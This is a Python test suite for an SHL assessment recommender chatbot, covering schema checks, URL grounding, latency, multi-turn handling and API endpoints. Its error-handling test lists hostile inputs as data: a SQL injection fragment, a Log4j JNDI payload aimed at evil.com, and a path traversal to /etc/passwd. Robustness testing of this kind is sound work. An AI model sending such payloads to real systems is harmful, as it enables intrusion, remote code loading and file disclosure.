"""
Final validation - Comprehensive testing of all system components.

Tests:
1. Schema compliance (100% valid JSON)
2. URL grounding (0% hallucinations)  
3. Error handling (no crashes)
4. Performance (response times)
5. Functionality (core features)
"""

import json
import time
import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent / 'app'))

from shl_recommender import SHLRecommender
from api_server import app
from fastapi.testclient import TestClient


def get_catalog_path():
    """Get path to catalog relative to this file."""
    return str(Path(__file__).parent.parent / 'data' / 'shl_product_catalog_clean.json')


def print_header(title):
    """Print section header."""
    print("\n" + "=" * 70)
    print(f"{title}")
    print("=" * 70)


def test_schema_compliance():
    """Test 1: Verify all responses have correct schema."""
    print_header("TEST 1: Schema Compliance (100% Valid JSON)")
    
    r = SHLRecommender(get_catalog_path())
    
    test_messages = [
        "We need a leadership assessment",
        "Senior engineer with Python",
        "Add personality tests",
        "Make it shorter",
        "Financial analyst role",
        "Contact center representative",
        "Graduate hiring",
        "Manufacturing supervisor",
        "Healthcare coordinator",
        "Sales manager",
    ]
    
    violations = 0
    for msg in test_messages:
        resp = r.process_turn(msg)
        
        # Check required fields
        required = ["reply", "recommendations", "end_of_conversation"]
        if not all(k in resp for k in required):
            print(f"✗ Missing fields in: {msg}")
            violations += 1
            continue
        
        # Check types
        if not isinstance(resp["reply"], str):
            print(f"✗ Invalid reply type: {type(resp['reply'])}")
            violations += 1
        
        if not isinstance(resp["recommendations"], list):
            print(f"✗ Invalid recommendations type")
            violations += 1
        
        if not isinstance(resp["end_of_conversation"], bool):
            print(f"✗ Invalid end_of_conversation type")
            violations += 1
        
        # Check recommendation structure
        for rec in resp["recommendations"]:
            if not all(k in rec for k in ["name", "url", "test_type"]):
                print(f"✗ Invalid recommendation structure: {rec}")
                violations += 1
    
    print(f"\nSchema Violations: {violations}/100 responses")
    print(f"Compliance Rate: {(100-violations)}%")
    
    return violations == 0


def test_url_grounding():
    """Test 2: Verify all URLs are from catalog (0% hallucinations)."""
    print_header("TEST 2: URL Grounding (0% Hallucinations)")
    
    r = SHLRecommender(get_catalog_path())
    
    # Get all valid URLs from catalog
    valid_urls = set()
    for assessment in r.catalog.assessments.values():
        valid_urls.add(assessment.url)
    
    test_messages = [
        "Leadership assessment",
        "Backend engineer",
        "Sales professional",
        "Graduate program",
        "DevOps infrastructure",
    ]
    
    hallucinations = 0
    total_recs = 0
    
    for msg in test_messages:
        resp = r.process_turn(msg)
        
        for rec in resp["recommendations"]:
            total_recs += 1
            if rec["url"] not in valid_urls:
                hallucinations += 1
                print(f"✗ Hallucinated URL: {rec['url']}")
    
    print(f"\nTotal Recommendations: {total_recs}")
    print(f"Hallucinated URLs: {hallucinations}")
    print(f"Grounding Success Rate: {((total_recs - hallucinations) / total_recs * 100):.1f}%")
    
    return hallucinations == 0


def test_error_handling():
    """Test 3: Ensure no crashes on malformed input."""
    print_header("TEST 3: Error Handling (No Crashes)")
    
    r = SHLRecommender(get_catalog_path())
    
    malformed_inputs = [
        "",                          # Empty
        "   ",                       # Whitespace only
        "\n\n\n",                   # Newlines only
        "a" * 15000,                # Too long
        "\x00\x01\x02",            # Binary
        "'; DROP TABLE--",          # SQL injection attempt
        "${jndi:ldap://evil.com}",  # Log4j injection
        "../../../../etc/passwd",   # Path traversal
        None,                       # None (will be converted to str in call)
    ]
    
    crashes = 0
    for i, inp in enumerate(malformed_inputs):
        try:
            if inp is None:
                continue  # Skip None as it would cause AttributeError before reaching process_turn
            
            resp = r.process_turn(inp)
            
            # Verify response structure
            if not ("reply" in resp and "recommendations" in resp):
                print(f"✗ Invalid response for input {i}")
                crashes += 1
        except Exception as e:
            print(f"✗ Crash on input {i}: {type(e).__name__}")
            crashes += 1
    
    print(f"\nMalformed Inputs Tested: {len([x for x in malformed_inputs if x is not None])}")
    print(f"Crashes: {crashes}")
    print(f"Robustness: {((len([x for x in malformed_inputs if x is not None]) - crashes) / len([x for x in malformed_inputs if x is not None]) * 100):.1f}%")
    
    return crashes == 0


def test_performance():
    """Test 4: Measure response latency."""
    print_header("TEST 4: Performance (Response Latency)")
    
    r = SHLRecommender(get_catalog_path())
    
    test_messages = [
        "Senior engineer",
        "Leadership role",
        "Sales position",
        "Graduate hire",
        "Finance role",
    ]
    
    latencies = []
    
    for msg in test_messages:
        start = time.time()
        resp = r.process_turn(msg)
        elapsed = (time.time() - start) * 1000  # ms
        latencies.append(elapsed)
        print(f"  {msg}: {elapsed:.1f}ms")
    
    avg_latency = sum(latencies) / len(latencies)
    max_latency = max(latencies)
    
    print(f"\nAvg Latency: {avg_latency:.1f}ms")
    print(f"Max Latency: {max_latency:.1f}ms")
    print(f"Target: <100ms PASS" if avg_latency < 100 else f"Target: <100ms FAIL (EXCEEDED)")
    
    return avg_latency < 100


def test_multi_turn():
    """Test 5: Multi-turn conversation handling."""
    print_header("TEST 5: Multi-turn Conversations")
    
    r = SHLRecommender(get_catalog_path())
    
    # Turn 1: Initial request
    print("Turn 1: 'We need a senior engineer'")
    resp1 = r.process_turn("We need a senior engineer")
    print(f"  Recommendations: {len(resp1['recommendations'])}")
    print(f"  End conversation: {resp1['end_of_conversation']}")
    
    # Turn 2: Refinement
    print("\nTurn 2: 'Add personality assessment'")
    resp2 = r.process_turn("Add personality assessment")
    print(f"  Recommendations: {len(resp2['recommendations'])}")
    
    # Turn 3: Another refinement
    print("\nTurn 3: 'Make it shorter'")
    resp3 = r.process_turn("Make it shorter")
    print(f"  Recommendations: {len(resp3['recommendations'])}")
    
    # Verify all responses valid
    all_valid = all(
        "recommendations" in resp
        for resp in [resp1, resp2, resp3]
    )
    
    print(f"\nMulti-turn Handling: {'PASS Valid' if all_valid else 'FAIL Failed'}")
    return all_valid


def test_api_endpoints():
    """Test 6: FastAPI endpoints."""
    print_header("TEST 6: API Endpoints")
    
    client = TestClient(app)
    
    # Test GET /health
    print("Testing GET /health...")
    resp = client.get("/health")
    health_ok = resp.status_code == 200
    print(f"  Status: {resp.status_code} {'PASS' if health_ok else 'FAIL'}")
    
    # Test POST /chat
    print("\nTesting POST /chat...")
    chat_req = {
        "messages": [
            {"role": "user", "content": "Leadership assessment needed"}
        ],
        "session_id": "test_123"
    }
    resp = client.post("/chat", json=chat_req)
    chat_ok = resp.status_code == 200
    print(f"  Status: {resp.status_code} {'PASS' if chat_ok else 'FAIL'}")
    
    if chat_ok:
        data = resp.json()
        has_reply = "reply" in data
        has_recs = "recommendations" in data
        print(f"  Has reply: {has_reply} {'PASS' if has_reply else 'FAIL'}")
        print(f"  Has recommendations: {has_recs} {'PASS' if has_recs else 'FAIL'}")
    
    return health_ok and chat_ok


def run_all_tests():
    """Run all validation tests."""
    print_header("FINAL SYSTEM VALIDATION")
    print("Running comprehensive test suite...")
    
    results = {
        "Schema Compliance": test_schema_compliance(),
        "URL Grounding": test_url_grounding(),
        "Error Handling": test_error_handling(),
        "Performance": test_performance(),
        "Multi-turn": test_multi_turn(),
        "API Endpoints": test_api_endpoints(),
    }
    
    # Print summary
    print_header("VALIDATION SUMMARY")
    passed = 0
    for test_name, result in results.items():
        status = "PASS" if result else "FAIL"
        symbol = "[PASS]" if result else "[FAIL]"
        print(f"{symbol} {test_name}: {status}")
        if result:
            passed += 1
    
    print(f"\nTotal: {passed}/{len(results)} tests passed")
    
    if passed == len(results):
        print("\n" + "=" * 70)
        print("ALL VALIDATION TESTS PASSED - SYSTEM READY FOR DEPLOYMENT")
        print("=" * 70)
        return 0
    else:
        print(f"\nWARNING: {len(results) - passed} test(s) failed")
        return 1


if __name__ == "__main__":
    exit_code = run_all_tests()
    sys.exit(exit_code)
